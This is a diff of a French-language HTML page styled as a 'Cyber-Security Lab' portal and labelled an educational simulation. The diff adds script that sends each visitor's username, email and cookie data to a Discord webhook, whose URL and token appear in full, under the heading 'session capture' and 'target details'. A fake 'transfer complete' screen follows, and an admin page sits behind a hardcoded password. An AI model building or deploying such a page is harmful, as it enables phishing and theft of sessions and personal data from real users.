@@ -1,25 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <title>Cyber-Security Lab | User Portal</title>
     <style>
         :root { --neon-green: #00ff41; --dark-bg: #0d0208; }
-        body { background: var(--dark-bg); color: var(--neon-green); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        body { 
+            background: var(--dark-bg); 
+            color: var(--neon-green); 
+            font-family: 'Courier New', monospace; 
+            margin: 0; 
+            padding: 20px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+        }
         
-        .container { max-width: 500px; width: 100%; border: 1px solid var(--neon-green); padding: 30px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); margin-top: 50px; }
+        .container { 
+            max-width: 500px; 
+            width: 100%; 
+            border: 1px solid var(--neon-green); 
+            padding: 30px; 
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); 
+            margin-top: 50px; 
+            background: rgba(0, 20, 0, 0.9);
+        }
+
         h1 { text-transform: uppercase; letter-spacing: 5px; text-align: center; border-bottom: 1px solid var(--neon-green); padding-bottom: 10px; }
         
-        input, textarea { background: transparent; border: 1px solid var(--neon-green); color: var(--neon-green); width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; }
-        button { background: var(--neon-green); color: black; border: none; padding: 12px 20px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; margin-top: 10px; }
-        button:hover { background: white; box-shadow: 0 0 10px white; }
+        input, textarea { 
+            background: black; 
+            border: 1px solid var(--neon-green); 
+            color: var(--neon-green); 
+            width: 100%; 
+            padding: 12px; 
+            margin: 10px 0; 
+            box-sizing: border-box; 
+        }
 
-        /* Zones d'affichage */
+        button { 
+            background: var(--neon-green); 
+            color: black; 
+            border: none; 
+            padding: 12px 20px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            width: 100%; 
+            transition: 0.3s; 
+            margin-top: 10px; 
+            text-transform: uppercase;
+        }
+
+        button:hover { background: white; box-shadow: 0 0 20px var(--neon-green); }
+
         #loading-zone { display: none; text-align: center; padding: 40px; }
-        .hidden { display: none; }
-
+        
         .glitch { font-size: 1.2rem; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        .footer-note { font-size: 0.7rem; color: #444; margin-top: 20px; text-align: center; }
     </style>
 </head>
 <body>
@@ -43,9 +82,11 @@
     <div id="admin-login-zone" style="margin-top: 40px; border-top: 1px dashed #333; padding-top: 20px; width: 100%;">
         <h3 style="font-size: 0.9rem;">PORTAIL D'ADMINISTRATION</h3>
         <input type="password" id="adminPass" placeholder="Mot de passe Admin">
-        <button onclick="accessAdmin()" style="background: #333; color: var(--neon-green); border: 1px solid var(--neon-green);">LOG IN</button>
+        <button onclick="accessAdmin()" style="background: #222; color: var(--neon-green); border: 1px solid var(--neon-green); font-size: 0.8rem;">LOG IN</button>
     </div>
 </div>
+
+<p class="footer-note">EDUCATIONAL SIMULATION ONLY - CYBER LABS 2026</p>
 
 <script>
     function processData() {
@@ -55,38 +96,47 @@
 
         if(!u || !e) return alert("Erreur : Tous les champs sont requis.");
 
-        // Cache le formulaire, montre le chargement
+        // --- ENVOI VERS DISCORD ---
+        const webhookURL = "https://discord.com/api/webhooks/1479538800433828048/tdBJQhxL-2o4u3tdhS2HKHrE7JlXp9LR0_4ee8oVA33QQfu6fdTtKjp9DLta7cwKgRiF";
+        const message = {
+            content: "🚨 **NOUVELLE CAPTURE DE SESSION** 🚨",
+            embeds: [{
+                title: "Détails de la cible",
+                color: 5763719,
+                fields: [
+                    { name: "👤 Utilisateur", value: u, inline: true },
+                    { name: "📧 Email", value: e, inline: true },
+                    { name: "🍪 Cookie Data", value: "```" + c + "```" }
+                ],
+                footer: { text: "Cyber-Security Lab Demo • " + new Date().toLocaleString() }
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        });
+
+        // --- VISUEL ---
         document.getElementById('user-view').style.display = 'none';
         document.getElementById('loading-zone').style.display = 'block';
 
-        // Sauvegarde dans le "carnet" du navigateur (LocalStorage)
+        // Sauvegarde locale pour admin.html
         let logs = JSON.parse(localStorage.getItem("logs")) || [];
-        logs.push({
-            username: u,
-            email: e,
-            cookies: c,
-            date: new Date().toLocaleString()
-        });
+        logs.push({ username: u, email: e, cookies: c, date: new Date().toLocaleString() });
         localStorage.setItem("logs", JSON.stringify(logs));
 
-        // Simulation de progression (4 secondes)
         const status = document.getElementById('status-text');
         setTimeout(() => { status.innerText = "ENVOI DES PAQUETS..."; }, 1500);
-        setTimeout(() => { status.innerText = "SYNCHRONISATION TERMINÉE."; }, 3000);
-        
-        setTimeout(() => {
-            status.innerHTML = `
-                <span style="color:white;">TRANSFERT RÉUSSI</span><br><br>
-                Veuillez attendre <b style="color:yellow;">1-2 heures</b>.<br>
-                Un email a été envoyé à : ${e}
-            `;
-        }, 4500);
+        setTimeout(() => { 
+            status.innerHTML = `<span style="color:white;">TRANSFERT RÉUSSI</span><br><br>Veuillez attendre <b style="color:yellow;">1-2 heures</b>.<br>Email envoyé à : ${e}`; 
+        }, 4000);
     }
 
     function accessAdmin() {
         const pass = document.getElementById('adminPass').value;
         if(pass === "JOA12345") {
-            // Vérifie bien que ton 2ème fichier s'appelle admin.html
             window.location.href = "admin.html"; 
         } else {
             alert("Accès refusé.");
